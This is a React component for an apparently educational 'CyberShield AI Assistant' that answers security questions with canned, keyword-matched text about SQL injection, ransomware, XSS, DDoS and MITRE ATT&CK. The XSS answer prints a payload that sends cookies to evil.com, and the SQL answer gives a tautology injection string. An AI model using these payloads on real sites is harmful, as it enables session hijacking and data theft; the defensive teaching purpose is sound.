import { useState, useRef, useEffect } from 'react';
import { Send, Bot, User, Shield, ExternalLink, Copy, Check } from 'lucide-react';

interface Message {
  id: string;
  role: 'user' | 'assistant';
  content: string;
  timestamp: Date;
  mitre?: string[];
}

const securityResponses: Record<string, { answer: string; mitre: string[] }> = {
  'sql injection': {
    answer: `**SQL Injection** is a code injection technique that exploits vulnerabilities in an application's database layer.\n\n**How it works:**\n- Attackers insert malicious SQL statements into input fields\n- The application executes unintended SQL commands\n- This can lead to data theft, modification, or deletion\n\n**Types:**\n1. **In-band (Classic)** - Uses same channel for attack and results\n2. **Out-of-band** - Uses different channels for data exfiltration\n3. **Inferential (Blind)** - No direct data visible, uses boolean/timeout responses\n\n**Example Attack:**\n\`' OR '1'='1' --\`\n\n**Prevention:**\n- Use parameterized queries (prepared statements)\n- Implement input validation and sanitization\n- Apply least privilege database permissions\n- Use WAF with SQL injection rules\n- Deploy ORM frameworks properly\n\n**Detection:**\n- Monitor for unusual SQL patterns in logs\n- Use database activity monitoring tools\n- Implement anomaly detection on query patterns`,
    mitre: ['T1190', 'T1059.005'],
  },
  'ransomware': {
    answer: `**Ransomware** is malicious software that encrypts files and demands payment for decryption.\n\n**Attack Chain:**\n1. Initial access (phishing, RDP exploit, supply chain)\n2. Execution and encryption (AES + RSA hybrid)\n3. Lateral movement via SMB/PsExec\n4. Data exfiltration (double extortion)\n5. Ransom note deployment\n\n**Major Families:**\n- **LockBit 3.0** - RaaS model, fastest encryption\n- **ALPHV/BlackCat** - Written in Rust, cross-platform\n- **Cl0p** - Focuses on data theft over encryption\n- **Royal** - Uses unique partial encryption\n\n**Prevention:**\n- Implement offline, immutable backups\n- Deploy EDR with behavioral detection\n- Segment network architecture\n- Disable macro execution in Office\n- Apply least privilege principle\n- Use email gateway with sandbox analysis\n\n**Incident Response:**\n- Isolate affected systems immediately\n- Do NOT pay ransom (no guarantee of recovery)\n- Report to law enforcement (FBI IC3)\n- Restore from verified clean backups`,
    mitre: ['T1486', 'T1490', 'T1021.002'],
  },
  'mitre': {
    answer: `**MITRE ATT&CK** is a knowledge base of adversary tactics, techniques, and procedures (TTPs).\n\n**12 Tactical Categories:**\n1. **Reconnaissance** - Gathering information\n2. **Resource Development** - Establishing resources\n3. **Initial Access** - Entry point into network\n4. **Execution** - Running malicious code\n5. **Persistence** - Maintaining access\n6. **Privilege Escalation** - Gaining higher permissions\n7. **Defense Evasion** - Avoiding detection\n8. **Credential Access** - Stealing credentials\n9. **Discovery** - Understanding the environment\n10. **Lateral Movement** - Moving through network\n11. **Collection** - Gathering target data\n12. **Exfiltration** - Stealing data\n+ Command & Control, Impact\n\n**How to Use:**\n- Map detections to techniques\n- Identify coverage gaps\n- Prioritize high-frequency techniques\n- Build detection rules per technique\n- Create threat-informed defense strategies\n\n**ATT&CK Navigator:** Use for visualization of coverage and threat actor profiles.`,
    mitre: ['Tactic-Level Mapping'],
  },
  'xss': {
    answer: `**Cross-Site Scripting (XSS)** injects malicious scripts into trusted websites.\n\n**Types:**\n1. **Reflected XSS** - Script in HTTP request, reflected in response\n2. **Stored XSS** - Script persisted in database, served to all users\n3. **DOM-based XSS** - Script manipulates DOM without server interaction\n\n**Example Payload:**\n\`<script>document.location='https://evil.com/steal?c='+document.cookie</script>\`\n\n**Impact:**\n- Session hijacking and credential theft\n- Keylogging and form data capture\n- Cryptojacking (mining malware)\n- Phishing attacks from trusted origins\n- Worm propagation (Samy worm)\n\n**Prevention:**\n- Output encoding (context-aware)\n- Content Security Policy (CSP) headers\n- Use frameworks with auto-escaping (React, Angular)\n- Input validation with allowlists\n- HttpOnly + Secure cookie flags`,
    mitre: ['T1189', 'T1059.007'],
  },
  'ddos': {
    answer: `**DDoS (Distributed Denial of Service)** overwhelms targets with traffic from multiple sources.\n\n**Attack Categories:**\n1. **Volumetric** - Bandwidth saturation (UDP flood, DNS amplification)\n2. **Protocol** - Network stack exploitation (SYN flood, Ping of Death)\n3. **Application Layer** - Targeting web apps (HTTP flood, Slowloris)\n\n**Notable Attacks:**\n- 2016 Mirai botnet: 1.2 Tbps (Krebs on Security)\n- 2020 AWS Shield: 2.3 Tbps mitigation\n- 2023 HTTP/2 Rapid Reset: Zero-day abuse\n\n**Mitigation:**\n- DDoS protection service (Cloudflare, AWS Shield)\n- Rate limiting and traffic shaping\n- Anycast network distribution\n- Web Application Firewall rules\n- Geo-blocking and IP reputation lists\n- Auto-scaling infrastructure\n\n**Detection:**\n- Monitor traffic baseline anomalies\n- NetFlow/sFlow analysis\n- DNS query rate monitoring`,
    mitre: ['T1498', 'T1499'],
  },
};

function getResponse(input: string): { answer: string; mitre: string[] } {
  const lower = input.toLowerCase();

  for (const [key, value] of Object.entries(securityResponses)) {
    if (lower.includes(key)) return value;
  }

  if (lower.includes('cve-')) {
    const cveId = lower.match(/CVE-\d{4}-\d+/)?.[0]?.toUpperCase() || input.toUpperCase().match(/CVE-\d{4}-\d+/)?.[0] || 'Unknown CVE';
    return {
      answer: `**${cveId}** Analysis:\n\nThis CVE identifier has been queried. For real-time CVE information:\n\n**Recommended Actions:**\n1. Check NIST National Vulnerability Database (NVD)\n2. Review vendor security advisories\n3. Cross-reference with MITRE ATT&CK\n4. Assess CVSS score and exploit availability\n\n**Quick Assessment Framework:**\n- CVSS Score: Check severity rating\n- Exploit Status: Public exploit available?\n- Affected Systems: What's in your inventory?\n- Patch Available: Vendor fix released?\n- Workaround: Compensating controls possible?\n\n**Response Priority:**\n- CVSS 9.0+ → Patch within 24-48 hours\n- CVSS 7.0-8.9 → Patch within 1 week\n- CVSS 4.0-6.9 → Patch within 30 days\n- CVSS < 4.0 → Schedule regular patching`,
      mitre: ['T1190'],
    };
  }

  if (lower.includes('firewall') || lower.includes('network security')) {
    return {
      answer: `**Network Security & Firewalls**\n\n**Firewall Types:**\n1. **Packet Filtering** - Examines headers, basic rules\n2. **Stateful Inspection** - Tracks connection state\n3. **Next-Gen (NGFW)** - DPI, IPS, app awareness\n4. **Web Application Firewall** - HTTP/HTTPS layer protection\n\n**Best Practices:**\n- Default deny policy\n- Regular rule auditing (quarterly)\n- Log all denied traffic\n- Segment network zones (DMZ, internal, restricted)\n- Implement zero-trust microsegmentation\n\n**Common Misconfigurations:**\n- Overly permissive rules (Any/Any)\n- Shadow rules contradicting explicit denies\n- No egress filtering\n- Forgotten temporary rules\n- Lack of geoblocking for unnecessary regions`,
      mitre: ['T1090', 'T1573'],
    };
  }

  return {
    answer: `I can help you with cybersecurity topics. Try asking about:\n\n- **SQL Injection** - How it works and prevention\n- **Ransomware** - Attack chain and response\n- **XSS** - Types and mitigation\n- **DDoS** - Attack categories and protection\n- **MITRE ATT&CK** - Framework overview\n- **CVE-XXXX-XXXX** - Vulnerability analysis\n- **Firewall/Network Security** - Best practices\n- **Password Security** - Policies and attacks\n- **Zero Trust** - Architecture principles\n- **Incident Response** - Framework and procedures\n\nI provide threat explanations, security recommendations, and MITRE ATT&CK mapping for all topics.`,
    mitre: [],
  };
}

export function AIChatbot() {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: 'welcome',
      role: 'assistant',
      content: 'Welcome to CyberShield AI Assistant. I can help you with threat analysis, vulnerability explanations, MITRE ATT&CK mapping, and security recommendations. What would you like to know?',
      timestamp: new Date(),
    },
  ]);
  const [input, setInput] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const handleSend = () => {
    if (!input.trim()) return;
    const userMsg: Message = {
      id: Date.now().toString(),
      role: 'user',
      content: input,
      timestamp: new Date(),
    };
    setMessages(prev => [...prev, userMsg]);
    setInput('');
    setIsTyping(true);

    setTimeout(() => {
      const { answer, mitre } = getResponse(input);
      const assistantMsg: Message = {
        id: (Date.now() + 1).toString(),
        role: 'assistant',
        content: answer,
        timestamp: new Date(),
        mitre,
      };
      setMessages(prev => [...prev, assistantMsg]);
      setIsTyping(false);
    }, 800 + Math.random() * 1200);
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopied(id);
    setTimeout(() => setCopied(null), 2000);
  };

  const suggestions = ['What is SQL Injection?', 'How do ransomware attacks work?', 'Explain XSS attacks', 'Tell me about DDoS', 'What is MITRE ATT&CK?'];

  return (
    <div className="flex flex-col h-[calc(100vh-3.5rem)]">
      {/* Chat messages */}
      <div className="flex-1 overflow-y-auto p-4 lg:p-6 space-y-4">
        {messages.map(msg => (
          <div key={msg.id} className={`flex gap-3 animate-slide-up ${msg.role === 'user' ? 'justify-end' : ''}`}>
            {msg.role === 'assistant' && (
              <div className="w-8 h-8 rounded-lg bg-sky-500/10 border border-sky-500/20 flex items-center justify-center shrink-0">
                <Bot className="w-4 h-4 text-sky-400" />
              </div>
            )}
            <div className={`max-w-[80%] lg:max-w-[70%] ${msg.role === 'user' ? 'order-first' : ''}`}>
              <div className={`rounded-xl p-4 ${
                msg.role === 'user'
                  ? 'bg-sky-600/20 border border-sky-500/20'
                  : 'cyber-card'
              }`}>
                <div className="text-sm text-slate-200 whitespace-pre-wrap leading-relaxed prose-sm">
                  {msg.content.split('**').map((part, i) =>
                    i % 2 === 1 ? <strong key={i} className="text-white font-semibold">{part}</strong> : <span key={i}>{part}</span>
                  )}
                  {msg.content.split('`').map((part, i) =>
                    i % 2 === 1 ? <code key={`code-${i}`} className="bg-[#111827] text-sky-300 px-1.5 py-0.5 rounded text-xs font-mono-cyber">{part}</code> : null
                  )}
                </div>
              </div>
              {msg.role === 'assistant' && (
                <div className="flex items-center gap-2 mt-2">
                  <button
                    onClick={() => copyToClipboard(msg.content, msg.id)}
                    className="flex items-center gap-1 text-[10px] text-slate-600 hover:text-slate-400 transition-colors"
                  >
                    {copied === msg.id ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    {copied === msg.id ? 'Copied' : 'Copy'}
                  </button>
                  {msg.mitre && msg.mitre.length > 0 && (
                    <div className="flex gap-1">
                      {msg.mitre.map(m => (
                        <span key={m} className="px-1.5 py-0.5 text-[10px] bg-purple-500/10 text-purple-400 border border-purple-500/20 rounded font-mono-cyber">
                          {m}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>
            {msg.role === 'user' && (
              <div className="w-8 h-8 rounded-lg bg-[#1a2744] border border-[#2a3d5e] flex items-center justify-center shrink-0">
                <User className="w-4 h-4 text-slate-400" />
              </div>
            )}
          </div>
        ))}
        {isTyping && (
          <div className="flex gap-3 animate-fade-in">
            <div className="w-8 h-8 rounded-lg bg-sky-500/10 border border-sky-500/20 flex items-center justify-center shrink-0">
              <Bot className="w-4 h-4 text-sky-400" />
            </div>
            <div className="cyber-card rounded-xl p-4">
              <div className="typing-indicator flex gap-1">
                <span className="w-2 h-2 rounded-full bg-sky-400" />
                <span className="w-2 h-2 rounded-full bg-sky-400" />
                <span className="w-2 h-2 rounded-full bg-sky-400" />
              </div>
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* Suggestions */}
      {messages.length <= 2 && (
        <div className="px-4 lg:px-6 pb-2">
          <div className="flex flex-wrap gap-2">
            {suggestions.map(s => (
              <button
                key={s}
                onClick={() => { setInput(s); }}
                className="px-3 py-1.5 text-xs bg-[#111827] border border-[#1a2744] rounded-lg text-slate-400 hover:text-sky-400 hover:border-sky-500/30 transition-all"
              >
                {s}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Input */}
      <div className="p-4 lg:p-6 border-t border-[#1a2744] bg-[#080d18]/50">
        <div className="flex gap-3">
          <input
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleSend()}
            placeholder="Ask about threats, vulnerabilities, MITRE ATT&CK..."
            className="flex-1 cyber-input"
          />
          <button onClick={handleSend} disabled={!input.trim() || isTyping} className="cyber-btn disabled:opacity-40 disabled:cursor-not-allowed">
            <Send className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  );
}
